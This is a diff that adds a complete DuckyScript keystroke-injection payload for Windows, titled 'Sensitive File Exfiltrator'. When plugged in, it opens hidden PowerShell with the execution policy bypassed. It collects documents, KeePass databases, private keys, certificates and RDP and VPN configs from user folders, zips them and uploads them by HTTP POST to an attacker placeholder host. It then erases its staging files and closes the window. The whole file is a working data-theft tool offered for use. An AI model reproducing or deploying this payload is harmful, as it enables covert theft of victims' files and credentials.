@@ -1,0 +1,71 @@
+REM ==========================================
+REM Title: Sensitive File Exfiltrator
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Searches common user
+REM   directories for sensitive document types
+REM   (docx, xlsx, pdf, pptx, csv, txt, kdbx)
+REM   and stages them for exfiltration via
+REM   HTTP POST to a remote server.
+REM Category: Collection / Exfiltration
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -W Hidden -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Configuration
+STRING $exfilUrl = 'https://ATTACKER_C2/upload'
+ENTER
+DELAY 350
+STRING $maxFileSize = 10MB
+ENTER
+DELAY 350
+STRING $stagingDir = "$env:TEMP\sysdiag"
+ENTER
+DELAY 350
+STRING New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
+ENTER
+DELAY 400
+REM Define file extensions to hunt for
+STRING $extensions = @('*.docx','*.xlsx','*.pdf','*.pptx','*.csv','*.kdbx','*.key','*.pem','*.pfx','*.rdp','*.ovpn','*.conf')
+ENTER
+DELAY 350
+REM Define search paths
+STRING $searchPaths = @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive")
+ENTER
+DELAY 400
+REM Search and collect files
+STRING $found = @()
+ENTER
+DELAY 350
+STRING foreach ($path in $searchPaths) { if (Test-Path $path) { foreach ($ext in $extensions) { $found += Get-ChildItem -Path $path -Filter $ext -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt $maxFileSize } } } }
+ENTER
+DELAY 500
+REM Copy found files to staging
+STRING foreach ($f in $found) { Copy-Item $f.FullName -Destination "$stagingDir\$($f.Name)" -Force 2>$null }
+ENTER
+DELAY 500
+REM Compress staged files
+STRING $zipPath = "$env:TEMP\diag_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
+ENTER
+DELAY 350
+STRING Compress-Archive -Path "$stagingDir\*" -DestinationPath $zipPath -Force
+ENTER
+DELAY 500
+REM Exfiltrate via HTTP POST
+STRING try { Invoke-RestMethod -Uri $exfilUrl -Method POST -InFile $zipPath -ContentType 'application/octet-stream' -Headers @{'X-Host'=$env:COMPUTERNAME} } catch {}
+ENTER
+DELAY 500
+REM Cleanup staging directory and zip
+STRING Remove-Item -Path $stagingDir -Recurse -Force 2>$null
+ENTER
+DELAY 350
+STRING Remove-Item -Path $zipPath -Force 2>$null
+ENTER
+DELAY 350
+STRING Clear-Host; exit
+ENTER
+DELAY 300
+ALT F4
